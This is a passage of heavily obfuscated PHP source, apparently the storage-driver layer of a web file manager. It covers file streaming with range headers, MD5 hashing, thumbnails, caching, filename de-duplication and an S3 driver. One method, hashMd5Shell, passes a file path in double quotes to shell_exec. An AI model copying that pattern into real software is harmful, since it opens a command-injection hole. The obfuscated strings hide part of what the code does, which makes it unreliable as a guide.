$ÉØº™‰ä[$Ì’Ãà·[96]][$Ì’Ãà·[95]]; } else { $üïËêõ¨ = substr($ÉØº™‰ä[$Ì’Ãà·[94]], strlen(get_path_father($ú÷éÎ™Â))); $üïËêõ¨ = $Ì’Ãà·[8] . ltrim($üïËêõ¨, $Ì’Ãà·[8]); } $“Óª®‚¨ = array($Ì’Ãà·[94] => $üïËêõ¨, $Ì’Ãà·[85] => $ÉØº™‰ä[$Ì’Ãà·[85]]); if (isset($ÉØº™‰ä[$Ì’Ãà·[86]]) && !$ÉØº™‰ä[$Ì’Ãà·[85]]) { $“Óª®‚¨[$Ì’Ãà·[86]] = $ÉØº™‰ä[$Ì’Ãà·[86]]; } if (isset($ÉØº™‰ä[$Ì’Ãà·[95]])) { $“Óª®‚¨[$Ì’Ãà·[95]] = $ÉØº™‰ä[$Ì’Ãà·[95]]; } if (!$ÉØº™‰ä[$Ì’Ãà·[85]]) { $“Óª®‚¨[$Ì’Ãà·[97]] = $û³âñ™ò; } $‹œ® ˜®[] = $“Óª®‚¨; } return $‹œ® ˜®; } public function upload($êéâŸş, $Û±ö‚µ, $ôå¨ÒŸ = false, $³Ôå§ó­ = REPEAT_REPLACE) { } public function uploadFileByID($ı£ÄàÅ, $›Ûœ…Ü†, $ƒÂòÀÔ) { } public function uploadFileByPath($‡Á‹˜¦¹, $“¾»ïÃë, $Ôò¼æŞ° = array()) { } public function isUploadServer() { $×˜·ô¡æ =& $_SERVER[¤·²È‰º]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $×˜·ô¡æ[98]) { return !0; } return $GLOBALS[$×˜·ô¡æ[6]][$×˜·ô¡æ[99]][$×˜·ô¡æ[100]]; } public function isFileOutServer() { $ˆ¡ìãÄ± =& $_SERVER[¤·²È‰º]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ˆ¡ìãÄ±[98]) { return !0; } return $GLOBALS[$ˆ¡ìãÄ±[6]][$ˆ¡ìãÄ±[99]][$ˆ¡ìãÄ±[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($¢ÚÈæÓÌ) { $æ¥üß =& $_SERVER[¤·²È‰º]; if (!$this->isCdnHost()) { return $¢ÚÈæÓÌ; } return str_replace(trim(get_url_root($¢ÚÈæÓÌ), $æ¥üß[8]), trim($this->cdnHost, $æ¥üß[8]), $¢ÚÈæÓÌ); } public function uploadLink($áÅÂ¾ƒ­, $öÉú ÒÕ = 0) { $ÓÚƒ¾Ã­ =& $_SERVER[¤·²È‰º]; if ($this->isUploadServer()) { return; } $ÓÊÓ£•™ = $this->getType(); if (!in_array($ÓÊÓ£•™, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $â¦Ã”š = 1024 * 1024 * 10; $›Ü¹ëó = $öÉú ÒÕ <= $â¦Ã”š ? $ÓÚƒ¾Ã­[102] : $ÓÚƒ¾Ã­[103]; $‡÷›·ûÉ = (!$öÉú ÒÕ ? 1 : ceil($öÉú ÒÕ / pow(1024, 3))) * 3600 * 4; $û®¢—Ç± = $this->{$›Ü¹ëó}($áÅÂ¾ƒ­, $‡÷›·ûÉ); if ($û®¢—Ç±) { $û®¢—Ç±[$ÓÚƒ¾Ã­[104]] = $áÅÂ¾ƒ­; $û®¢—Ç±[$ÓÚƒ¾Ã­[105]] = $ÓÊÓ£•™; } return $û®¢—Ç±; } public function uploadFormData($¨òêÂáú, $‹û‘Êıø = 3600) { } public function multiUploadFormData($ú«½ü, $™Ó”¢Üú = 3600) { } public function download($£›ƒˆ©, $èåœé‘™) { } public function ext($ÕÔìà²Õ) { $£›Â»¤® =& $_SERVER[¤·²È‰º]; if (strpos($ÕÔìà²Õ, $£›Â»¤®[8]) === -1) { $§æ˜ùÅÅ = $ÕÔìà²Õ; } else { $§æ˜ùÅÅ = $this->pathThis($ÕÔìà²Õ); } $àÜ“Åæã = $£›Â»¤®[12]; if (strstr($§æ˜ùÅÅ, $£›Â»¤®[10])) { $àÜ“Åæã = substr($§æ˜ùÅÅ, strrpos($§æ˜ùÅÅ, $£›Â»¤®[10]) + 1); $àÜ“Åæã = strtolower($àÜ“Åæã); } if (strlen($àÜ“Åæã) > 3 && preg_match($£›Â»¤®[106], $àÜ“Åæã, $Š¯‡šæş)) { $àÜ“Åæã = $£›Â»¤®[12]; } return $àÜ“Åæã; } public function pathThis($‚“ú¯æŒ) { $–åÚşÜ =& $_SERVER[¤·²È‰º]; $‚“ú¯æŒ = str_replace($–åÚşÜ[107], $–åÚşÜ[8], rtrim($‚“ú¯æŒ, $–åÚşÜ[8])); $£ğñ§ôä = strrpos($‚“ú¯æŒ, $–åÚşÜ[8]); if ($£ğñ§ôä === !1) { return $‚“ú¯æŒ; } return substr($‚“ú¯æŒ, $£ğñ§ôä + 1); } public function pathFather($Ç£·ıà) { $¯ï¼’ß =& $_SERVER[¤·²È‰º]; $Ç£·ıà = str_replace($¯ï¼’ß[107], $¯ï¼’ß[8], rtrim($Ç£·ıà, $¯ï¼’ß[8])); $‚ª™„Ş¥ = strrpos($Ç£·ıà, $¯ï¼’ß[8]); if ($‚ª™„Ş¥ === !1) { return $¯ï¼’ß[12]; } return substr($Ç£·ıà, 0, $‚ª™„Ş¥ + 1); } public function hashSimple($¨¯¨·ÍŒ) { $ƒ¢–İ„• =& $_SERVER[¤·²È‰º]; if (!$¨¯¨·ÍŒ) { return md5($ƒ¢–İ„•[12]); } $ĞÉŒş‹³ = $this->size($¨¯¨·ÍŒ); $‰±ş¤şà = 200; $Ø§•œ = 50; if ($ĞÉŒş‹³ <= $‰±ş¤şà * $Ø§•œ) { return $this->hashMd5($¨¯¨·ÍŒ) . $ĞÉŒş‹³; } $Üûñê˜ = intval($ĞÉŒş‹³ / $Ø§•œ); $ïËûƒ² = $ƒ¢–İ„•[12]; for ($±£­§ËÌ = 0; $±£­§ËÌ < $Ø§•œ; $±£­§ËÌ++) { $ïËûƒ² .= $this->fileSubstr($¨¯¨·ÍŒ, $Üûñê˜ * $±£­§ËÌ, $‰±ş¤şà); } $ïËûƒ² .= $this->fileSubstr($¨¯¨·ÍŒ, $ĞÉŒş‹³ - $‰±ş¤şà, $‰±ş¤şà); return md5($ïËûƒ²) . $ĞÉŒş‹³; } public static $md5Cache = array(); public function hashMd5($®Ò®û‰ƒ) { if (!$®Ò®û‰ƒ) { return md5($_SERVER[¤·²È‰º][12]); } $®Ò®û‰ƒ = $this->iconvSystem($®Ò®û‰ƒ); if (isset(self::$md5Cache[$®Ò®û‰ƒ])) { return self::$md5Cache[$®Ò®û‰ƒ]; } self::$md5Cache[$®Ò®û‰ƒ] = $this->hashMd5Shell($®Ò®û‰ƒ); if (!self::$md5Cache[$®Ò®û‰ƒ]) { self::$md5Cache[$®Ò®û‰ƒ] = @md5_file($®Ò®û‰ƒ); } return self::$md5Cache[$®Ò®û‰ƒ]; } private function hashMd5Shell($Õ–³ÊŞ€) { $Ä™‡óòÒ =& $_SERVER[¤·²È‰º]; if (!$Õ–³ÊŞ€) { return md5($Ä™‡óòÒ[12]); } if (!function_exists($Ä™‡óòÒ[108])) { return !1; } $Ú÷¡±Ì´ = array($Ä™‡óòÒ[109], $Ä™‡óòÒ[110]); $«µÛ¨óÅ = Cache::get($Ä™‡óòÒ[111]); if (!$«µÛ¨óÅ) { $ç·û¼„§ = BASIC_PATH . $Ä™‡óòÒ[112]; $Ì¦‡§Ší = md5_file($ç·û¼„§); $«µÛ¨óÅ = $Ä™‡óòÒ[113]; foreach ($Ú÷¡±Ì´ as $ıîé¯ß·) { $£ÉùÌ‚ã = shell_exec($ıîé¯ß· . "\x20\x22{$ç·û¼„§}\42"); if ($£ÉùÌ‚ã && substr(trim($£ÉùÌ‚ã), 0, 32) == $Ì¦‡§Ší) { $«µÛ¨óÅ = $ıîé¯ß·; break; } } Cache::set($Ä™‡óòÒ[111], $«µÛ¨óÅ, 3600); } if ($«µÛ¨óÅ == $Ä™‡óòÒ[113]) { return !1; } $£ÉùÌ‚ã = shell_exec($«µÛ¨óÅ . "\40\42{$Õ–³ÊŞ€}\x22"); $£ÉùÌ‚ã = str_replace($Ä™‡óòÒ[114], $Ä™‡óòÒ[12], $£ÉùÌ‚ã); return substr($£ÉùÌ‚ã, 0, 32); } public function link($Œêï¬Ö£) { return $Œêï¬Ö£; } public function fileOut($Í ÙÈ¥, $¦„‚šæ = false, $úÍ£ğƒİ = false, $¿œ¡ÛİÜ = '') { $˜î˜ì¿Á =& $_SERVER[¤·²È‰º]; $this->cacheMethod(null, null); if (!$Í ÙÈ¥ || !$this->exist($Í ÙÈ¥)) { show_json(LNG($˜î˜ì¿Á[115]), !1, $úÍ£ğƒİ); } $ı—Ôíª° = $this->getType() == $˜î˜ì¿Á[116]; $Úòş•å¬ = $GLOBALS[$˜î˜ì¿Á[6]][$˜î˜ì¿Á[99]][$˜î˜ì¿Á[117]][$˜î˜ì¿Á[118]]; $¦Éòî˜õ = (double) $GLOBALS[$˜î˜ì¿Á[6]][$˜î˜ì¿Á[99]][$˜î˜ì¿Á[117]][$˜î˜ì¿Á[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $øÓã™İ = $this->infoFull($Í ÙÈ¥); $¤µœé®€ = $øÓã™İ[$˜î˜ì¿Á[86]]; $ëÆœìõ = gmdate($˜î˜ì¿Á[120], $øÓã™İ[$˜î˜ì¿Á[95]]); $óÊåş¸ = $úÍ£ğƒİ ? $úÍ£ğƒİ : $this->iconvApp($øÓã™İ[$˜î˜ì¿Á[42]]); $ÏòÍ‘úÆ = 0; $¨›êÀ†å = $¤µœé®€ - 1; $ŒÔ…åæ = $this->ext($óÊåş¸); if (in_array($ŒÔ…åæ, array($˜î˜ì¿Á[121], $˜î˜ì¿Á[122], $˜î˜ì¿Á[123], $˜î˜ì¿Á[124]))) { $ŒÔ…åæ = $˜î˜ì¿Á[125]; } if (in_array($ŒÔ…åæ, array($˜î˜ì¿Á[126]))) { $ŒÔ…åæ = $˜î˜ì¿Á[127]; } if (!$¿œ¡ÛİÜ) { $¿œ¡ÛİÜ = md5($ëÆœìõ . $this->hashSimple($Í ÙÈ¥)); } $¿œ¡ÛİÜ = $˜î˜ì¿Á[128] . $¿œ¡ÛİÜ . $˜î˜ì¿Á[128]; $É§¦íĞŞ = get_file_mime($ŒÔ…åæ); $»Ù¯ä = !0; $»Ù¯ä = isset($_GET[$˜î˜ì¿Á[129]]) ? !1 : !0; if ($¦„‚šæ === !1 && !mime_support($É§¦íĞŞ)) { $É§¦íĞŞ = $˜î˜ì¿Á[130]; } header($˜î˜ì¿Á[131]); header($˜î˜ì¿Á[132] . $É§¦íĞŞ); $ĞÉéË…£ = rawurlencode($óÊåş¸); $ĞÉéË…£ = $˜î˜ì¿Á[128] . $ĞÉéË…£ . $˜î˜ì¿Á[133] . $ĞÉéË…£; if ($¦„‚šæ) { header($˜î˜ì¿Á[134]); header($˜î˜ì¿Á[135] . $ĞÉéË…£); } else { if ($»Ù¯ä) { header($˜î˜ì¿Á[136] . $ĞÉéË…£); } } header($˜î˜ì¿Á[137] . gmdate($˜î˜ì¿Á[120], time() + 3600 * 24 * 30) . $˜î˜ì¿Á[138]); header($˜î˜ì¿Á[139]); header($˜î˜ì¿Á[140]); header($˜î˜ì¿Á[141]); if (isset($_SERVER[$˜î˜ì¿Á[142]]) && strtotime($_SERVER[$˜î˜ì¿Á[142]]) == $øÓã™İ[$˜î˜ì¿Á[95]]) { header($˜î˜ì¿Á[143], !0, 304); die; } if (isset($_SERVER[$˜î˜ì¿Á[144]]) && $_SERVER[$˜î˜ì¿Á[144]] == $¿œ¡ÛİÜ) { header($˜î˜ì¿Á[145] . $¿œ¡ÛİÜ, !0, 304); die; } header($˜î˜ì¿Á[145] . $¿œ¡ÛİÜ); header($˜î˜ì¿Á[146] . $ëÆœìõ . $˜î˜ì¿Á[138]); header($˜î˜ì¿Á[147] . $óÊåş¸); header($˜î˜ì¿Á[148]); header($˜î˜ì¿Á[149] . $¤µœé®€); header($˜î˜ì¿Á[150]); if (!$¦„‚šæ && $ŒÔ…åæ == $˜î˜ì¿Á[151]) { if ($¤µœé®€ > 1024 * 1024 * 5) { die; } $µÌØ‡ªÔ = $this->getContent($Í ÙÈ¥); $µÌØ‡ªÔ = Html::clearSVG($µÌØ‡ªÔ); header($˜î˜ì¿Á[152] . strlen($µÌØ‡ªÔ)); echo $µÌØ‡ªÔ; die; } $’´¸’Å± = strtolower($_SERVER[$˜î˜ì¿Á[153]]); if ($ı—Ôíª° && $’´¸’Å± && $Úòş•å¬) { if (strstr($’´¸’Å±, $˜î˜ì¿Á[154])) { header($˜î˜ì¿Á[155] . $Í ÙÈ¥); } else { if (strstr($’´¸’Å±, $˜î˜ì¿Á[156])) { header($˜î˜ì¿Á[157] . $Í ÙÈ¥); } else { if (strstr($’´¸’Å±, $˜î˜ì¿Á[158])) { header($˜î˜ì¿Á[159] . $Í ÙÈ¥); } } } if ($¦Éòî˜õ) { header($˜î˜ì¿Á[160] . $¦Éòî˜õ); } return; } if (isset($_SERVER[$˜î˜ì¿Á[161]])) { if (preg_match($˜î˜ì¿Á[162], $_SERVER[$˜î˜ì¿Á[161]], $Í©Şéø)) { $ÏòÍ‘úÆ = intval($Í©Şéø[1]); if (!empty($Í©Şéø[2])) { $¨›êÀ†å = intval($Í©Şéø[2]); } } header($˜î˜ì¿Á[163]); header("\x43\x6f\156\x74\x65\156\164\x2d\x52\141\x6e\147\145\x3a\40\x62\x79\x74\145\x73\40{$ÏòÍ‘úÆ}\55{$¨›êÀ†å}\x2f" . $¤µœé®€); } else { header($˜î˜ì¿Á[164]); } header($˜î˜ì¿Á[165]); $§ù¾½Ñ = !0; if ($_SERVER[$˜î˜ì¿Á[166]] == $˜î˜ì¿Á[167] && $¤µœé®€ > 1204 * 1024 * 1024 * 2) { $§ù¾½Ñ = !1; } if ($§ù¾½Ñ) { header($˜î˜ì¿Á[168] . ($¨›êÀ†å - $ÏòÍ‘úÆ + 1)); } if ($_SERVER[$˜î˜ì¿Á[169]] == $˜î˜ì¿Á[170]) { return; } $çÍ§¸¤È = 1024 * 100; $ÇÜä¡§‚ = 0; if ($¦Éòî˜õ) { $ÇÜä¡§‚ = intval(1000 * 1000 * ($çÍ§¸¤È / $¦Éòî˜õ)); } while ($ÏòÍ‘úÆ <= $¨›êÀ†å) { $§íµ¬êí = timeFloat(); check_abort(); $çÄÊÚÅé = $¨›êÀ†å - $ÏòÍ‘úÆ + 1; if ($çÄÊÚÅé <= $çÍ§¸¤È) { $çÍ§¸¤È = $çÄÊÚÅé; } echo $this->fileSubstr($Í ÙÈ¥, $ÏòÍ‘úÆ, $çÍ§¸¤È); $ÏòÍ‘úÆ += $çÍ§¸¤È; if ($çÍ§¸¤È == $çÄÊÚÅé) { $ÏòÍ‘úÆ = $¨›êÀ†å + 1; } if ($ÇÜä¡§‚) { $İÌ©­Óõ = intval(1000 * 1000 * (timeFloat() - $§íµ¬êí)); $æŒŒ©² = $ÇÜä¡§‚ - $İÌ©­Óõ; if ($æŒŒ©² > 5) { usleep($æŒŒ©²); } } } } public function fileOutServer($ÇÑİ¬å, $Û“ù“ò¦ = false, $­­é‚Î­ = false, $È³‡¶« = '') { $this->fileOut($ÇÑİ¬å, $Û“ù“ò¦, $­­é‚Î­, $È³‡¶«); } public function fileOutLink($’€äúêë) { header($_SERVER[¤·²È‰º][171] . $’€äúêë); die; } public function cacheMethod($—ƒÕåŞÇ, $ğãş¿òÑ, $…­´‹¾› = null) { $­®âÇ =& $_SERVER[¤·²È‰º]; static $¿ùğğÕ¿ = array(); $Ò€Ïí¦ = $ğãş¿òÑ ? ltrim($this->getPathOuter($ğãş¿òÑ), $­®âÇ[8]) : $­®âÇ[12]; $¾æ‹ÊÉ— = $­®âÇ[172] . $—ƒÕåŞÇ . $­®âÇ[173] . rtrim($Ò€Ïí¦, $­®âÇ[8]); if (is_null($—ƒÕåŞÇ)) { $¿ùğğÕ¿ = array(); return; } if (is_null($ğãş¿òÑ)) { foreach ($¿ùğğÕ¿ as $¾æ‹ÊÉ— => $Öìğêıµ) { if (!strstr($¾æ‹ÊÉ—, $­®âÇ[172] . $—ƒÕåŞÇ . $­®âÇ[174])) { continue; } unset($¿ùğğÕ¿[$¾æ‹ÊÉ—]); } return; } if (!is_null($…­´‹¾›)) { $¿ùğğÕ¿[$¾æ‹ÊÉ—] = $…­´‹¾›; return; } $‚ë•êÉ = isset($¿ùğğÕ¿[$¾æ‹ÊÉ—]) ? $¿ùğğÕ¿[$¾æ‹ÊÉ—] : null; if (!is_null($‚ë•êÉ)) { return $‚ë•êÉ; } $‚ë•êÉ = $this->{$—ƒÕåŞÇ}($ğãş¿òÑ); $¿ùğğÕ¿[$¾æ‹ÊÉ—] = $‚ë•êÉ; return $‚ë•êÉ; } public function cacheMethodInfoSet($›İİïê”, $­ıÚ»å, $©Š‰ö¸ = false) { $ÃÇıõê© =& $_SERVER[¤·²È‰º]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÃÇıõê©[175], $›İİïê”, $­ıÚ»å); $this->cacheMethod($ÃÇıõê©[176], $›İİïê”, $­ıÚ»å ? !1 : !0); if (is_array($©Š‰ö¸)) { $this->cacheMethod($ÃÇıõê©[177], $›İİïê”, $©Š‰ö¸); } } public function fileOutImage($§“¶¥“€, $à¼íáë = 250) { $•ÀçÛôê =& $_SERVER[¤·²È‰º]; set_timeout(); if (substr($§“¶¥“€, 0, 4) == $•ÀçÛôê[158]) { $this->fileOutLink($§“¶¥“€); } $©Ï‚¦•Š = $this->info($§“¶¥“€); $õÃ¾¤‡Ø = $©Ï‚¦•Š[$•ÀçÛôê[42]]; $‚œâú = !1; if (isset($GLOBALS[$•ÀçÛôê[178]]) && $GLOBALS[$•ÀçÛôê[178]][$•ÀçÛôê[94]] == $©Ï‚¦•Š[$•ÀçÛôê[94]]) { $ùï–Ë¸÷ = $GLOBALS[$•ÀçÛôê[178]][$•ÀçÛôê[179]]; if (!$©Ï‚¦•Š[$•ÀçÛôê[180]]) { $©Ï‚¦•Š[$•ÀçÛôê[180]] = $GLOBALS[$•ÀçÛôê[178]]; } if (isset($ùï–Ë¸÷[$•ÀçÛôê[181]])) { if ($ùï–Ë¸÷[$•ÀçÛôê[181]] <= $à¼íáë && $ùï–Ë¸÷[$•ÀçÛôê[182]] <= $à¼íáë) { $‚œâú = !0; } } $õÃ¾¤‡Ø = $©Ï‚¦•Š[$•ÀçÛôê[180]][$•ÀçÛôê[42]]; } if ($©Ï‚¦•Š[$•ÀçÛôê[86]] <= 1024 * 50 || $‚œâú || !function_exists($•ÀçÛôê[183]) || $©Ï‚¦•Š[$•ÀçÛôê[184]] == $•ÀçÛôê[185]) { return $this->fileOut($§“¶¥“€, !1, $õÃ¾¤‡Ø); } if (isset($©Ï‚¦•Š[$•ÀçÛôê[180]][$•ÀçÛôê[186]])) { $ÆîÁ¤›è = $©Ï‚¦•Š[$•ÀçÛôê[180]][$•ÀçÛôê[186]]; } else { if (isset($©Ï‚¦•Š[$•ÀçÛôê[180]][$•ÀçÛôê[187]])) { $ÆîÁ¤›è = $©Ï‚¦•Š[$•ÀçÛôê[180]][$•ÀçÛôê[187]]; } } if (!$ÆîÁ¤›è) { $ÆîÁ¤›è = md5("{$©Ï‚¦•Š[$•ÀçÛôê[42]]}\x5f{$©Ï‚¦•Š[$•ÀçÛôê[94]]}\137{$©Ï‚¦•Š[$•ÀçÛôê[86]]}\137{$à¼íáë}"); } $’ÑÊí·À = "{$ÆîÁ¤›è}\137{$à¼íáë}\56\160\156\147"; if (!($µúúƒêÙ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $•ÀçÛôê[188]))) { $ù³îşÏÀ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $•ÀçÛôê[189]); } else { $ù³îşÏÀ = KodIO::make($µúúƒêÙ); } if ($µúúƒêÙ = IO::fileNameExist($ù³îşÏÀ, $’ÑÊí·À)) { $úÏá‡ùŒ = KodIO::make($µúúƒêÙ); return IO::fileOut($úÏá‡ùŒ, !1, $õÃ¾¤‡Ø); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $úÏá‡ùŒ = DATA_THUMB . $’ÑÊí·À; del_file($úÏá‡ùŒ); if (!@file_exists($úÏá‡ùŒ)) { $ô‰„‰á· = TEMP_FILES; if (!is_dir($ô‰„‰á·)) { mk_dir($ô‰„‰á·); } $øÄá¨Â = $ô‰„‰á· . $ÆîÁ¤›è . $•ÀçÛôê[10] . $©Ï‚¦•Š[$•ÀçÛôê[184]]; if (!@file_exists($øÄá¨Â)) { $øÄá¨Â = $this->download($§“¶¥“€, $øÄá¨Â); } ImageThumb::createThumb($øÄá¨Â, $úÏá‡ùŒ, $à¼íáë, $à¼íáë * 10); } if (!file_exists($úÏá‡ùŒ) || filesize($úÏá‡ùŒ) < 100) { return @file_exists($øÄá¨Â) ? IO::fileOut($øÄá¨Â) : $this->fileOut($§“¶¥“€); } if (!($û“ãæ… = IO::move($úÏá‡ùŒ, $ù³îşÏÀ))) { return IO::fileOut($úÏá‡ùŒ); } del_file($úÏá‡ùŒ); IO::fileOut($û“ãæ…); } public function fileOutImageServer($¤ˆıüëÁ, $’€Í­Ò = 250) { $this->fileOutImage($¤ˆıüëÁ, $’€Í­Ò); } public function fileNameAuto($Í²ÆÚ»ª, $àÄºŠãÆ, $½ïÜ÷ºŒ = REPEAT_RENAME, $ªâıâœ = false) { $¢Ä¢¹ĞÑ =& $_SERVER[¤·²È‰º]; $éÜùé®å = $Í²ÆÚ»ª === $¢Ä¢¹ĞÑ[12] ? $àÄºŠãÆ : rtrim($Í²ÆÚ»ª, $¢Ä¢¹ĞÑ[8]) . $¢Ä¢¹ĞÑ[8] . $àÄºŠãÆ; if ($½ïÜ÷ºŒ == REPEAT_REPLACE || !$this->exist($éÜùé®å) || $ªâıâœ && $½ïÜ÷ºŒ != REPEAT_RENAME_FOLDER) { return $àÄºŠãÆ; } if ($½ïÜ÷ºŒ == REPEAT_SKIP) { return !1; } $¸ËŒ•ÊÀ = $¢Ä¢¹ĞÑ[10] . get_path_ext($àÄºŠãÆ); $¸ËŒ•ÊÀ = $¸ËŒ•ÊÀ == $¢Ä¢¹ĞÑ[10] || $ªâıâœ ? $¢Ä¢¹ĞÑ[12] : $¸ËŒ•ÊÀ; $ëí÷·“ = 1; $ÈêÅ ää = substr($àÄºŠãÆ, 0, strlen($àÄºŠãÆ) - strlen($¸ËŒ•ÊÀ)); $º´„â”¢ = $ÈêÅ ää . "\50{$ëí÷·“}\51{$¸ËŒ•ÊÀ}"; while ($this->exist(rtrim($Í²ÆÚ»ª, $¢Ä¢¹ĞÑ[8]) . $¢Ä¢¹ĞÑ[8] . $º´„â”¢)) { $º´„â”¢ = $ÈêÅ ää . "\50{$ëí÷·“}\x29{$¸ËŒ•ÊÀ}"; $ëí÷·“++; } return $º´„â”¢; } private function fileNameAutoList($Ù×÷‡ô, $ğÀĞâõÛ, $ñ“¤ì = false) { $·ÈïÅ¢· =& $_SERVER[¤·²È‰º]; $ÑÑ¹Ï³è = $this->listPath($Ù×÷‡ô, !0); $ÑÑ¹Ï³è = array_merge($ÑÑ¹Ï³è[$·ÈïÅ¢·[92]], $ÑÑ¹Ï³è[$·ÈïÅ¢·[93]]); $Àëó…Ü˜ = array_to_keyvalue($ÑÑ¹Ï³è, $·ÈïÅ¢·[12], $·ÈïÅ¢·[42]); $íâìï‘¡ = $·ÈïÅ¢·[10] . get_path_ext($ğÀĞâõÛ); $íâìï‘¡ = $íâìï‘¡ == $·ÈïÅ¢·[10] || $ñ“¤ì ? $·ÈïÅ¢·[12] : $íâìï‘¡; $Ô´¦§ë¨ = substr($ğÀĞâõÛ, 0, strlen($ğÀĞâõÛ) - strlen($íâìï‘¡)); $Ö ½¬» = $Ô´¦§ë¨ . "\50\x30\51{$íâìï‘¡}"; for ($©ê€”şæ = 1; $©ê€”şæ <= count($Àëó…Ü˜) + 1; $©ê€”şæ++) { $Ö ½¬» = $Ô´¦§ë¨ . "\x28{$©ê€”şæ}\x29{$íâìï‘¡}"; if (!in_array_not_case($Ö ½¬», $Àëó…Ü˜)) { return $Ö ½¬»; } } return $Ö ½¬»; } public function listAllFiles($‹Ëº½éû, $Áºü–ÌÑ, $Éš¹ôŞ = array()) { $şÖÌØíŒ =& $_SERVER[¤·²È‰º]; if (empty($Áºü–ÌÑ)) { return array(); } $ı›©‰ˆú = array(); $‹Ëº½éû = trim($‹Ëº½éû, $şÖÌØíŒ[8]); foreach ($Áºü–ÌÑ as $±Ã­ùã†) { $Ù—ÜÔı = ltrim(substr(trim($±Ã­ùã†, $şÖÌØíŒ[8]), strlen($‹Ëº½éû)), $şÖÌØíŒ[8]); $ı›©‰ˆú = array_merge($ı›©‰ˆú, $this->slicePath($Ù—ÜÔı)); } $·™®£ê = array(); foreach (array_unique($ı›©‰ˆú) as $±Ã­ùã†) { $—ïÙ­¬­ = array($şÖÌØíŒ[94] => $this->getPathOuter($şÖÌØíŒ[8] . $‹Ëº½éû . $şÖÌØíŒ[8] . $±Ã­ùã†), $şÖÌØíŒ[85] => 1, $şÖÌØíŒ[86] => 0); if (substr($±Ã­ùã†, -1) != $şÖÌØíŒ[8]) { $—ïÙ­¬­[$şÖÌØíŒ[85]] = 0; $Áµú´¬œ = $this->getPath($‹Ëº½éû . $şÖÌØíŒ[8] . $±Ã­ùã†); $—ïÙ­¬­[$şÖÌØíŒ[86]] = isset($Éš¹ôŞ[$Áµú´¬œ]) ? $Éš¹ôŞ[$Áµú´¬œ] : $this->size($Áµú´¬œ); } $·™®£ê[] = $—ïÙ­¬­; } return $·™®£ê; } public function slicePath($ø©±‡ãÛ) { $ß†úë­ =& $_SERVER[¤·²È‰º]; $•ĞÊÊ‚Ô = explode($ß†úë­[8], trim($ø©±‡ãÛ, $ß†úë­[8])); $ğ³Ş™ = 0; do { ++$ğ³Ş™; $ÔÉÛ¦½ı[] = implode($ß†úë­[8], array_slice($•ĞÊÊ‚Ô, 0, $ğ³Ş™)) . $ß†úë­[8]; } while ($ğ³Ş™ < count($•ĞÊÊ‚Ô)); $ÔÉÛ¦½ı[count($•ĞÊÊ‚Ô) - 1] = $ø©±‡ãÛ; return $ÔÉÛ¦½ı; } public function getHost() { $´±ˆèü§ =& $_SERVER[¤·²È‰º]; $³ êª» = parse_url(trim($this->domain, $´±ˆèü§[8])); $ğÊş¨±œ = isset($³ êª»[$´±ˆèü§[190]]) ? $³ êª»[$´±ˆèü§[190]] : http_type(); $úšŞÚ¬µ = isset($³ êª»[$´±ˆèü§[191]]) ? $³ êª»[$´±ˆèü§[191]] : $³ êª»[$´±ˆèü§[94]]; if (isset($³ êª»[$´±ˆèü§[192]])) { $úšŞÚ¬µ .= $´±ˆèü§[4] . $³ êª»[$´±ˆèü§[192]]; } return $ğÊş¨±œ . $´±ˆèü§[193] . $úšŞÚ¬µ; } public function pathEncode($ïµ°Ìõ÷) { $ğƒ³Óû¼ =& $_SERVER[¤·²È‰º]; return str_replace($ğƒ³Óû¼[194], $ğƒ³Óû¼[8], rawurlencode($ïµ°Ìõ÷)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($ì¨§íßƒ) { set_timeout(); require_once SDK_DIR . $_SERVER[¤·²È‰º][195]; parent::__construct(); $this->_init($ì¨§íßƒ); } public function _init($Ôğß€¹æ) { foreach ($Ôğß€¹æ as $Ãî¿›Š÷ => $äğ“âÉ³) { if (isset($this->{$Ãî¿›Š÷})) { $this->{$Ãî¿›Š÷} = $äğ“âÉ³; } } $this->endpoint = $Ôğß€¹æ[$_SERVER[¤·²È‰º][196]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ºÓğÁŒ” = "\166\64") { $this->signVer = $ºÓğÁŒ”; $this->client->setSignatureVersion($ºÓğÁŒ”); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $Ü‚Öôš¡ =& $_SERVER[¤·²È‰º]; $£âñÕô‰ = $this->getBucketCors(); if (!$£âñÕô‰ || !is_array($£âñÕô‰)) { return !1; } if ($£âñÕô‰[$Ü‚Öôš¡[197]] != $Ü‚Öôš¡[198] || $£âñÕô‰[$Ü‚Öôš¡[199]] != $Ü‚Öôš¡[198]) { return !1; } $º‡ó‡Ç = array_map($Ü‚Öôš¡[200], $£âñÕô‰[$Ü‚Öôš¡[201]]); if (!is_array($º‡ó‡Ç)) { $º‡ó‡Ç = array(); } $ƒ“×ì—— = array($Ü‚Öôš¡[202], $Ü‚Öôš¡[203], $Ü‚Öôš¡[204], $Ü‚Öôš¡[205], $Ü‚Öôš¡[206]); $Áƒñêó¾ = array_diff($ƒ“×ì——, $º‡ó‡Ç); return empty($Áƒñêó¾); } public function mkfile($­ƒŸ®º±, $Â•ùü‡ = '', $¬ºÛæ± = REPEAT_RENAME) { $­´áŒ¿­ = $this->setContent($­ƒŸ®º±, $Â•ùü‡); if ($­´áŒ¿­ !== !1) { return $this->getPathOuter($­ƒŸ®º±); } return !1; } public function mkdir($†Ú¿œû¿, $çä¶à”¸ = REPEAT_SKIP) { $ş’Ö×é¥ =& $_SERVER[¤·²È‰º]; if (empty($†Ú¿œû¿) && $†Ú¿œû¿ !== $ş’Ö×é¥[207]) { return !1; } if ($çä¶à”¸ && 